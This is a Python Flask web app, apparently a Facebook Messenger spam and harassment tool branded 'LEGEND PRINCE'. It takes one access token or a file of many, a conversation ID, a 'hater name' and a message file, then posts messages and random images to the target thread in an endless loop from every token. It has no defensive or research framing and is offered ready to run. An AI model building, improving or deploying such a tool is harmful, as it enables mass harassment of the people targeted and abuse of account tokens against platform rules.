from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import os
import json
 
app = Flask(__name__)
app.debug = True
 
# Create uploads directory if it doesn't exist
if not os.path.exists('uploads'):
    os.makedirs('uploads')
 
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
 
stop_events = {}
threads = {}
 
def upload_and_send_image(access_token, image_path, thread_id):
    """Upload and send image using Facebook Graph API v22"""
    try:
        # Step 1: Get upload session
        upload_session_url = f'https://graph.facebook.com/v22.0/{thread_id}/attachment_uploads'
        files = {
            'file': (os.path.basename(image_path), open(image_path, 'rb'), 'image/jpeg')
        }
        data = {
            'access_token': access_token,
            'file_type': 'image'
        }
        
        session_response = requests.post(upload_session_url, files=files, data=data)
        
        if session_response.status_code == 200:
            upload_data = session_response.json()
            attachment_upload_id = upload_data.get('id')
            
            if attachment_upload_id:
                # Step 2: Send message with attachment
                message_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
                message_data = {
                    'access_token': access_token,
                    'message': ' ',
                    'attachment_upload_id': attachment_upload_id
                }
                
                message_response = requests.post(message_url, data=message_data)
                return message_response.status_code == 200
        return False
        
    except Exception as e:
        print(f"Error in image upload/send: {e}")
        return False

def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id):
    stop_event = stop_events[task_id]
    
    while not stop_event.is_set():
        for i, message1 in enumerate(messages):
            if stop_event.is_set():
                break
            
            # Send message
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                    
                api_url = f'https://graph.facebook.com/v22.0/{thread_id}/messages'
                message = str(mn) + ' ' + message1
                parameters = {
                    'access_token': access_token, 
                    'message': message
                }
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✓ Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"✗ Message Failed From token {access_token}: {response.text}")
                time.sleep(time_interval)
            
            # Send image after each message if image files are provided
            if image_files and not stop_event.is_set():
                for access_token in access_tokens:
                    if stop_event.is_set():
                        break
                        
                    # Select random image
                    image_file = random.choice(image_files)
                    image_path = os.path.join('uploads', image_file)
                    
                    if os.path.exists(image_path):
                        success = upload_and_send_image(access_token, image_path, thread_id)
                        if success:
                            print(f"✓ Image Sent Successfully From token {access_token}: {image_file}")
                        else:
                            print(f"✗ Image Failed From token {access_token}: {image_file}")
                        
                        time.sleep(time_interval)
 
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()
 
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
 
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        
        # Handle image files upload
        image_files = []
        uploaded_images = request.files.getlist('imageFiles')
        for image in uploaded_images:
            if image and image.filename:
                # Save uploaded image
                filename = f"{int(time.time())}_{image.filename}"
                filepath = os.path.join('uploads', filename)
                image.save(filepath)
                image_files.append(filename)
 
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, image_files, task_id))
        threads[task_id] = thread
        thread.start()
 
        return f'Task started with ID: {task_id}'
 
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    label { color: white; }
    .file { height: 30px; }
    body {
      background-image: url('https://i.ibb.co/3y6KCjFL/1745140321925.png');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
    }
    .container {
      max-width: 350px;
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
      border: none;
      resize: none;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
    }
    .form-control-file {
      height: auto;
      padding: 10px;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
    .info-text {
      font-size: 12px;
      color: #ccc;
      margin-top: -15px;
      margin-bottom: 15px;
    }
    .image-preview {
      max-width: 100px;
      max-height: 100px;
      margin: 5px;
      border-radius: 5px;
      border: 1px solid white;
    }
    .success-message {
      color: green;
      font-weight: bold;
    }
    .error-message {
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAAB...">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required placeholder="t_1000...">
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required placeholder="Your Name">
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required min="1" value="2">
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <div class="mb-3">
        <label for="imageFiles" class="form-label">Upload Images (Multiple)</label>
        <input type="file" class="form-control form-control-file" id="imageFiles" name="imageFiles" multiple accept="image/*">
        <div class="info-text">Select multiple images to send in message-image cycle</div>
        <div id="imagePreview" class="mt-2"></div>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
    
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required placeholder="Enter task ID">
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄</p>
    <p>𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 <a href="https://www.facebook.com/100064267823693">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+917543864229" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    // Image preview functionality
    document.getElementById('imageFiles').addEventListener('change', function(e) {
      const preview = document.getElementById('imagePreview');
      preview.innerHTML = '';
      
      const files = e.target.files;
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        if (file.type.startsWith('image/')) {
          const reader = new FileReader();
          reader.onload = function(e) {
            const img = document.createElement('img');
            img.src = e.target.result;
            img.className = 'image-preview';
            preview.appendChild(img);
          }
          reader.readAsDataURL(file);
        }
      }
    });
    
    // Initialize on page load
    document.addEventListener('DOMContentLoaded', function() {
      toggleTokenInput();
    });
  </script>
</body>
</html>
''')
 
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
